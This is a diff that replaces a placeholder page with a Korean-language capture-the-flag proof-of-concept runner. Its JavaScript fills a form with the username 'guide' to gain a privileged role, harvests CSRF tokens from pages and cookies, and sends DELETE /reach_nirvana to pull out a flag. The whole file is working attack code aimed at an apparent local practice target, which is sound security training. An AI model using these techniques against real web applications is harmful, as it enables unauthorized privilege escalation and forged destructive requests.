@@ -1,1 +1,283 @@
-<p>Starlight page!</p>
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <title>CTF BlackBox 컨셉 검증 페이지</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    :root { color-scheme: light dark; }
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, "Noto Sans", Apple SD Gothic Neo, "Malgun Gothic", sans-serif; margin: 0; }
+    header { padding: 16px 20px; border-bottom: 1px solid #ddd; }
+    h1 { margin: 0; font-size: 18px; }
+    .wrap { display: grid; grid-template-columns: 1fr 420px; gap: 0; min-height: calc(100vh - 58px); }
+    #stage { border: none; width: 100%; height: calc(100vh - 58px); background: #f6f6f6; }
+    aside { border-left: 1px solid #ddd; }
+    #log { padding: 12px 14px; font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, "Noto Sans Mono", monospace; white-space: pre-wrap; word-break: break-word; height: calc(100vh - 58px); overflow: auto; }
+    .ok { color: #0a7f2e; font-weight: 600; }
+    .warn { color: #b07300; font-weight: 600; }
+    .err { color: #b00020; font-weight: 600; }
+    .muted { opacity: .7; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>CTF BlackBox PoC Runner (same-origin: <span id="origin"></span>)</h1>
+  </header>
+
+  <div class="wrap">
+    <!-- 동일 오리진에서 /awaken을 띄워 조작 -->
+    <iframe id="stage" title="awaken iframe"></iframe>
+
+    <aside>
+      <div id="log" aria-live="polite"></div>
+    </aside>
+  </div>
+
+  <noscript>
+    이 페이지는 자바스크립트가 필요합니다.
+  </noscript>
+
+  <script>
+    (function () {
+      const base = location.origin; // 기대: http://127.0.0.1:3000
+      const awakenPath = "/awaken";
+      const reachPath = "/reach_nirvana";
+      const usernameToUse = "guide"; // role=guide를 유도하기 위해 username을 guide로 사용
+
+      const logBox = document.getElementById("log");
+      const originEl = document.getElementById("origin");
+      const frame = document.getElementById("stage");
+
+      originEl.textContent = base;
+
+      function ts() {
+        const d = new Date();
+        return d.toISOString().replace("T", " ").replace("Z", "");
+      }
+      function log(msg, cls) {
+        const line = document.createElement("div");
+        if (cls) line.className = cls;
+        line.textContent = `[${ts()}] ${msg}`;
+        logBox.appendChild(line);
+        logBox.scrollTop = logBox.scrollHeight;
+      }
+      const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+      function getCookie(name) {
+        const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)'));
+        return m ? decodeURIComponent(m[1]) : null;
+      }
+
+      async function fetchHtml(path) {
+        const res = await fetch(new URL(path, base), { credentials: "same-origin" });
+        const text = await res.text();
+        const doc = new DOMParser().parseFromString(text, "text/html");
+        return { res, text, doc };
+      }
+
+      function findCsrfInDoc(doc) {
+        const sel = [
+          'input[name="_csrf"]',
+          'input[name="csrf"]',
+          'input[name="csrfToken"]',
+          'input[name="xsrf"]',
+          'input[name="XSRF-TOKEN"]',
+          'meta[name="csrf-token"]',
+          'meta[name="xsrf-token"]'
+        ];
+        for (const s of sel) {
+          const el = doc.querySelector(s);
+          if (!el) continue;
+          const val = el.content || el.value;
+          if (val) return val;
+        }
+        // 정규식 백업
+        const html = doc.documentElement.outerHTML;
+        const m = html.match(/name=["']?_csrf["']?\s+value=["']?([^"'>\s]+)/i);
+        if (m && m[1]) return m[1];
+        return null;
+      }
+
+      function findCsrfInCookies() {
+        // 널리 쓰이는 이름들 시도
+        const names = ["_csrf", "csrf", "csrfToken", "XSRF-TOKEN", "xsrf-token"];
+        for (const n of names) {
+          const v = getCookie(n);
+          if (v) return v;
+        }
+        return null;
+      }
+
+      async function obtainCsrfTokenFallback() {
+        // 여러 경로에서 토큰 재탐색
+        const candidates = ["/", "/awaken", "/profile", "/account", "/dashboard", "/login"];
+        for (const path of candidates) {
+          try {
+            const { doc } = await fetchHtml(path);
+            const token = findCsrfInDoc(doc) || findCsrfInCookies();
+            if (token) {
+              log(`CSRF 토큰 확보 (fallback from ${path}): ${token.slice(0, 12)}…`, "ok");
+              return token;
+            }
+          } catch (e) {
+            // ignore and keep trying
+          }
+        }
+        // 마지막으로 쿠키만이라도 시도
+        const ck = findCsrfInCookies();
+        if (ck) {
+          log(`CSRF 토큰(쿠키) 확보: ${ck.slice(0, 12)}…`, "ok");
+          return ck;
+        }
+        return null;
+      }
+
+      async function deleteReachNirvana(csrfToken) {
+        const headers = new Headers();
+        if (csrfToken) {
+          // 다양한 프레임워크 호환용으로 여러 이름 동시 설정
+          headers.set("x-csrf-token", csrfToken);
+          headers.set("x-xsrf-token", csrfToken);
+          headers.set("csrf-token", csrfToken);
+        }
+        const res = await fetch(new URL(reachPath, base), {
+          method: "DELETE",
+          headers,
+          credentials: "same-origin",
+        });
+        const bodyText = await res.text();
+        const flagMatch = bodyText.match(/FLAG\{[^}]+\}/i) || bodyText.match(/CTF\{[^}]+\}/i);
+        if (res.ok) {
+          log(`DELETE ${reachPath} 성공 (status ${res.status}).`, "ok");
+        } else {
+          log(`DELETE ${reachPath} 응답 상태: ${res.status}`, res.status >= 500 ? "err" : "warn");
+        }
+        if (flagMatch) {
+          log(`플래그 획득: ${flagMatch[0]}`, "ok");
+        } else {
+          log(`응답 본문(앞 1,000자):\n${bodyText.slice(0, 1000)}`, res.ok ? "muted" : "warn");
+        }
+        return res.ok;
+      }
+
+      async function run() {
+        log(`초기화: base=${base}, awaken=${awakenPath}, reach=${reachPath}`, "muted");
+
+        // 1) iframe으로 /awaken 접속
+        const awakenUrl = new URL(awakenPath, base).href;
+        const sameOrigin = new URL(awakenUrl).origin === location.origin;
+        if (!sameOrigin) {
+          log(`오리진 불일치: ${awakenUrl} vs ${location.origin}`, "err");
+          return;
+        }
+        frame.src = awakenUrl;
+        log(`iframe 로드 시도: ${awakenUrl}`);
+
+        // 2) 내부 username 폼 채우고 제출
+        await new Promise((resolve) => {
+          frame.addEventListener("load", resolve, { once: true });
+        });
+        log("iframe 로드 완료. 폼 탐색 중…");
+
+        let csrfFromAwaken = null;
+        try {
+          const doc = frame.contentWindow.document;
+          const form = doc.querySelector("form") || doc.forms?.[0] || null;
+          if (!form) {
+            log("폼을 찾을 수 없습니다. 계속 진행합니다(토큰/로그인은 fallback).", "warn");
+          } else {
+            // CSRF 토큰 선확보
+            csrfFromAwaken = findCsrfInDoc(doc) || findCsrfInCookies();
+            if (csrfFromAwaken) {
+              log(`CSRF 토큰 확보(awaken): ${csrfFromAwaken.slice(0, 12)}…`, "ok");
+            } else {
+              log("CSRF 토큰을 awaken 문서에서 찾지 못함. 나중에 재시도.", "warn");
+            }
+
+            // username 채우기
+            const userSel = [
+              'input[name="username"]',
+              '#username',
+              'input[type="text"][name]',
+              'input[type="text"]',
+              'input[name="user"]',
+            ];
+            let userInput = null;
+            for (const s of userSel) {
+              userInput = form.querySelector(s);
+              if (userInput) break;
+            }
+            if (userInput) {
+              userInput.focus();
+              userInput.value = usernameToUse;
+              userInput.dispatchEvent(new Event("input", { bubbles: true }));
+              log(`username 입력 완료: "${usernameToUse}"`, "ok");
+            } else {
+              log("username 입력란을 찾지 못했습니다. 그대로 제출 시도.", "warn");
+            }
+
+            // 제출
+            if (typeof form.requestSubmit === "function") {
+              form.requestSubmit();
+              log("form.requestSubmit() 호출", "muted");
+            } else {
+              const submitBtn = form.querySelector('[type="submit"], button, input[type="submit"]');
+              if (submitBtn) {
+                submitBtn.click();
+                log("submit 버튼 클릭", "muted");
+              } else {
+                form.submit();
+                log("form.submit() 호출", "muted");
+              }
+            }
+          }
+        } catch (e) {
+          log(`iframe 조작 중 오류: ${e && e.message ? e.message : e}`, "err");
+        }
+
+        // 서버가 계정정보를 읽고 저장/로그인할 시간을 약간 부여
+        await sleep(900);
+
+        // 3) 로그인 상태 가정하에 CSRF 토큰 확보 시도
+        let csrfToken = csrfFromAwaken || findCsrfInCookies();
+        if (!csrfToken) {
+          log("CSRF 토큰 재탐색(fallback) 시도…", "muted");
+          csrfToken = await obtainCsrfTokenFallback();
+        }
+        if (!csrfToken) {
+          log("CSRF 토큰을 찾지 못했습니다. 토큰 없이 DELETE 시도 후 재도전 로직으로 진행합니다.", "warn");
+        }
+
+        // 4) DELETE /reach_nirvana
+        let ok = false;
+        try {
+          ok = await deleteReachNirvana(csrfToken);
+        } catch (e) {
+          log(`DELETE 호출 오류: ${e && e.message ? e.message : e}`, "err");
+        }
+
+        // 5) 실패 시 토큰 재수집 후 1회 재시도
+        if (!ok) {
+          log("초기 DELETE 실패. 토큰 재수집 후 재시도합니다.", "warn");
+          try {
+            const newToken = await obtainCsrfTokenFallback();
+            if (newToken) {
+              await sleep(300);
+              await deleteReachNirvana(newToken);
+            } else {
+              log("재수집 실패: 더 이상 시도할 토큰이 없습니다.", "err");
+            }
+          } catch (e) {
+            log(`재시도 과정 오류: ${e && e.message ? e.message : e}`, "err");
+          }
+        }
+
+        log("수행 종료.", "muted");
+      }
+
+      // 실행
+      run().catch(e => log(`예상치 못한 오류: ${e && e.message ? e.message : e}`, "err"));
+    })();
+  </script>
+</body>
+</html>
